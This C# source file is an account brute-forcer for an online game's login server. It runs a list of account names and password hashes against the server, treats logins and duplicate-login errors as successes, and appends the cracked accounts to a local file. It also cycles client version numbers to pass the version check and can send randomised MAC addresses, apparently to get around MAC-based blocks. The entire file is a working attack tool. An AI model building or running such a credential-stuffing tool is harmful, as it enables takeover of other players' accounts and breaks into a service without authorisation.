using AceNetworking;
using Protocols;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace AceBruteforcer
{
    class PreSocket : AceClientSocket
    {
        ushort[] version = new ushort[4] { 1,0,0,24 };
        char[] serverGroupName;
        public PreSocket(string xorKey)
            : base(xorKey, false)
        {
        }



        public override void OnConnect()
        {
            InitVersionCheckBruteForce();
            new Thread(() =>
            {
                Thread.Sleep(60000);
                if(this.Connected)
                    this.Disconnect(PublicCommonDefines.DisconnectionReason.SOCKET_CLOSED_BY_CLIENT);
            }).Start();
        }

        public override void OnConnectFail()
        {
        }

        public override void OnDisconnect(PublicCommonDefines.DisconnectionReason reason)
        {
            new Thread(() => Program.Init()).Start();
        }

        public override void OnReceivedPacket(byte[] data, int len)
        {
            int nBytesUsed = 0;
            ushort nRecvType = 0;

            while (nBytesUsed < len)
            {
                nRecvType = BitConverter.ToUInt16(data, nBytesUsed);
                nBytesUsed += 2;
                switch (nRecvType)
                {
                    case Protocol.T_ERROR:
                        OnReceivedErrorFromServer(data, len, ref nBytesUsed);
                        return;
                    case Protocol.T_PC_CONNECT_SINGLE_FILE_UPDATE_INFO:
                        {
                            nBytesUsed += Marshal.SizeOf(new Protocol.MSG_PC_CONNECT_SINGLE_FILE_UPDATE_INFO());
                            SendNextVersionPacket(version, false);
                        }
                        break;
                    case Protocol.T_PC_CONNECT_SINGLE_FILE_VERSION_CHECK_OK:
                        {
                            SendNextVersionPacket(version, false);
                        }
                        break;
                    case Protocol.T_PC_CONNECT_UPDATE_INFO:
                        {
                            HandleUpdateInfo(data, len, ref nBytesUsed);
                        }
                        break;
                    case Protocol.T_PC_CONNECT_REINSTALL_CLIENT:
                        {
                            HandleReinstallClient(data, len, ref nBytesUsed);
                        }
                        break;
                    case Protocol.T_PC_CONNECT_VERSION_OK:
                        {
                            this.SendPacket(Protocol.T_PC_CONNECT_GET_SERVER_GROUP_LIST);
                        }
                        break;
                    case Protocol.T_PC_CONNECT_LOGIN_BLOCKED:
                        {
                            HandleAccountBlocked(data, len, ref nBytesUsed);
                        }
                        break;
                    case Protocol.T_PC_CONNECT_GET_SERVER_GROUP_LIST_OK:
                        {
                            HandleServerGroupListOk(data, len, ref nBytesUsed);
                        }
                        break;
                    case Protocol.T_PC_CONNECT_LOGIN_OK:
                        {
                            HandleLoginOK(data, len, ref nBytesUsed);
                        }
                        break;
                    case 0x10f2:
                        {
                        }
                        break;
                }
            }
        }

        string currname = "";
        public void WriteLoginSucceeded()
        {
            lock (Program.lockObj)
            {
                Console.WriteLine("Login succeeded: " + currname);
                string line = string.Format("{0} {1}", currname, BitConverter.ToString(Program.accDatas[currname]).Replace("-", string.Empty));
                var file = File.Open("X:\\acclist_cr.txt", FileMode.Append);
                var stream = new StreamWriter(file);
                stream.WriteLine(line);
                stream.Close();
            }
        }
        public void HandleLoginOK(byte[] data, int len, ref int nBytesUsed)
        {
            Protocol.MSG_PC_CONNECT_LOGIN_OK packet = Operations.ByteArrayToStruct<Protocol.MSG_PC_CONNECT_LOGIN_OK>(data, ref nBytesUsed);
            WriteLoginSucceeded();
            this.Disconnect(PublicCommonDefines.DisconnectionReason.SOCKET_CLOSED_BY_CLIENT);
        }
        public void HandleAccountBlocked(byte[] data, int len, ref int nBytesUsed)
        {
            this.Disconnect(PublicCommonDefines.DisconnectionReason.SOCKET_CLOSED_BY_CLIENT);
        }

        /// <summary>
        /// <para>Stormys super cool method of gettint a pw without showing the actual chars</para>
        /// </summary>
        /// <returns></returns>
        static string GetPWNoneVisible()
        {
            ConsoleKeyInfo key;
            string password = "";
            do
            {
                key = Console.ReadKey(true);

                if (key.Key != ConsoleKey.Backspace && key.Key != ConsoleKey.Enter)
                {
                    password += key.KeyChar;
                    Console.Write("*");
                }
                else
                {
                    if (key.Key == ConsoleKey.Backspace && password.Length > 0)
                    {
                        password = password.Substring(0, (password.Length - 1));
                        Console.Write("\b \b");
                    }
                }
            }
            // Stops Receving Keys Once Enter is Pressed
            while (key.Key != ConsoleKey.Enter);

            return password;
        }

        Protocol.MSG_PC_CONNECT_LOGIN loginpacket;
        public void StartLogInRoutine()
        {
            lock (Program.lockObj)
            {
                if (Program.idx >= Program.accDatas.Count)
                    Environment.Exit(0);

                var login = Program.accDatas.ElementAt(Program.idx);
                Program.idx++;
                currname = login.Key;
                loginpacket = new Protocol.MSG_PC_CONNECT_LOGIN();
                loginpacket.MGameSEX = loginpacket.MGameYear = 0;
                loginpacket.WebLoginAuthKey = Operations.ToCharArray("", 30);

                loginpacket.AccountName = Operations.ToCharArray(login.Key, 20);
                loginpacket.PrivateIP = Operations.ToCharArray("127.0.0.1", 16);

                loginpacket.ClientIP = loginpacket.PrivateIP;
                loginpacket.LoginType = (char)0;
                loginpacket.Password = login.Value;
                loginpacket.FieldServerGroupName = Operations.ToCharArray("MIZAR", 20);
                loginpacket.SelectiveShutdownInfo = Operations.ToCharArray("", 48);
            }
            this.SendPacket(Protocol.T_PC_CONNECT_LOGIN, loginpacket);
        }

        public void HandleServerGroupListOk(byte[] data, int len, ref int nBytesUsed)
        {
            //Protocol.MSG_PC_CONNECT_GET_SERVER_GROUP_LIST_OK packet = Operations.ByteArrayToStruct<Protocol.MSG_PC_CONNECT_GET_SERVER_GROUP_LIST_OK>(data, new Protocol.MSG_PC_CONNECT_GET_SERVER_GROUP_LIST_OK().GetType());
            Protocol.MSG_PC_CONNECT_GET_SERVER_GROUP_LIST_OK packet = Operations.ByteArrayToStruct<Protocol.MSG_PC_CONNECT_GET_SERVER_GROUP_LIST_OK>(data, ref nBytesUsed);
           // nBytesUsed--;
            Protocol.MEX_SERVER_GROUP_INFO_FOR_LAUNCHER[] groups = Operations.StructsArrayParse<Protocol.MEX_SERVER_GROUP_INFO_FOR_LAUNCHER>(data, packet.NumOfServerGroup, ref nBytesUsed);
            serverGroupName = packet.ServerGroup.ServerGroupName;
            if (packet.ServerGroup.Crowdedness < 0)
            {
                Console.WriteLine("All servers are currently under maintenance, you're unable to log in.", "Error", ConsoleColor.Red);
                Console.ReadKey();
                Environment.Exit(0);
            }

            StartLogInRoutine();
        }
        public override void OnReceivedPacketError(PublicCommonDefines.PacketDecryptError errorCode)
        {
            Console.WriteLine("Unable to decrypt incoming packet: " + errorCode, "Error", ConsoleColor.Red);
        }

        public override void OnDispatchPacketException(Exception ex, bool bSend)
        {
        }

        public void HandleReinstallClient(byte[] data, int len, ref int nBytesUsed)
        {
            // Protocol.MSG_PC_CONNECT_REINSTALL_CLIENT packet = Operations.ByteArrayToStruct<Protocol.MSG_PC_CONNECT_REINSTALL_CLIENT>(data, new Protocol.MSG_PC_CONNECT_REINSTALL_CLIENT().GetType());
            Protocol.MSG_PC_CONNECT_REINSTALL_CLIENT packet = Operations.ByteArrayToStruct<Protocol.MSG_PC_CONNECT_REINSTALL_CLIENT>(data, ref nBytesUsed);
            version = new ushort[4];
            version = packet.LastVersion;
            SendNextVersionPacket(version, false);

        }

        public void OnReceivedErrorFromServer(byte[] data, int len, ref int nBytesUsed)
        {
            //  Protocol.MSG_ERROR errData = Operations.ByteArrayToStruct<Protocol.MSG_ERROR>(data, new Protocol.MSG_ERROR().GetType());
            Protocol.MSG_ERROR errData = Operations.ByteArrayToStruct<Protocol.MSG_ERROR>(data, ref nBytesUsed);
            Protocol.Errors err = (Protocol.Errors)errData.ErrorCode;
            switch (err)
            {
                case Protocol.Errors.ERR_COMMON_LOGIN_FAILED:
                case Protocol.Errors.ERR_DB_NO_SUCH_ACCOUNT:
                case Protocol.Errors.ERR_PERMISSION_DENIED:
                    {
                        this.Disconnect(PublicCommonDefines.DisconnectionReason.SOCKET_CLOSED_BY_CLIENT);
                        Console.WriteLine("Failed");
                    }
                    break;
                case Protocol.Errors.ERR_PROTOCOL_DUPLICATE_LOGIN:
                    {
                        WriteLoginSucceeded();
                        this.Disconnect(PublicCommonDefines.DisconnectionReason.SOCKET_CLOSED_BY_CLIENT);
                    }
                    break;

                default:
                    {
                        this.Disconnect(PublicCommonDefines.DisconnectionReason.SOCKET_CLOSED_BY_CLIENT);
                        Console.WriteLine(String.Format("Received Error from Preserver. MsgType[{0}] ErrorCode[{1}] Param1[{2}] Param2[{3}]", errData.MsgType,
                            errData.ErrorCode, errData.ErrParam1, errData.ErrParam2), "Server Error", ConsoleColor.Red);

                    }
                    break;
            }
            if (errData.StringLength > 0)
                nBytesUsed += errData.StringLength;
            if (errData.CloseConnection)
            {
                Console.WriteLine("PreServer socket disconnected as requested by server.", "PreServer", ConsoleColor.Red);
            }


        }

        public void CalculateNextVersion(ref ushort[] version)
        {
            version[3]++;
            if (version[3] >= 99)
            {
                version[3] = 0;
                version[2]++;
            }

            if (version[2] >= 99)
            {
                version[2] = 0;
                version[1]++;
            }

            if (version[1] >= 99)
            {
                version[1] = 0;
                version[0]++;
            }
        }

        public void HandleUpdateInfo(byte[] data, int length, ref int nBytesUsed)
        {
            //  Protocol.MSG_PC_CONNECT_UPDATE_INFO packet = Operations.ByteArrayToStruct<Protocol.MSG_PC_CONNECT_UPDATE_INFO>(data, new Protocol.MSG_PC_CONNECT_UPDATE_INFO().GetType());
            Protocol.MSG_PC_CONNECT_UPDATE_INFO packet = Operations.ByteArrayToStruct<Protocol.MSG_PC_CONNECT_UPDATE_INFO>(data, ref nBytesUsed);
            SendNextVersionPacket(packet.UpdateVersion, false);
        }
        public void SendNextVersionPacket(ushort[] version, bool bSetNextVersion = true)
        {
            if (bSetNextVersion)
                CalculateNextVersion(ref version);

            Protocol.MSG_PC_CONNECT_VERSION ver = new Protocol.MSG_PC_CONNECT_VERSION();
            ver.ClientVersion = new ushort[4];
            ver.ClientVersion = version;
            this.SendPacket(Protocol.T_PC_CONNECT_VERSION, ver);
        }
        public void InitVersionCheckBruteForce()
        {
           // SendMacAddr();
            this.SendPacket(Protocol.T_PC_CONNECT_SINGLE_FILE_VERSION_CHECK, new Protocol.MSG_PC_CONNECT_SINGLE_FILE_VERSION_CHECK());

        }
        public void SendMacAddr()
        {
            Protocol.MSG_PC_CONNECT_SEND_GET_BLOCKED_MAC_ADDR packet = new Protocol.MSG_PC_CONNECT_SEND_GET_BLOCKED_MAC_ADDR();
            byte[] macBytes = new byte[6];
            new Random((int)(DateTime.Now.Ticks & 0xffffffff)).NextBytes(macBytes);
            string macString = string.Format("{0}-{1}-{2}-{3}-{4}-{5}", macBytes[0], macBytes[1], macBytes[2], macBytes[3], macBytes[4], macBytes[5]);
            packet.macAddr = Operations.ToCharArray(macString, 50);
            SendPacket(0x10f1, packet);
        }
    }
}
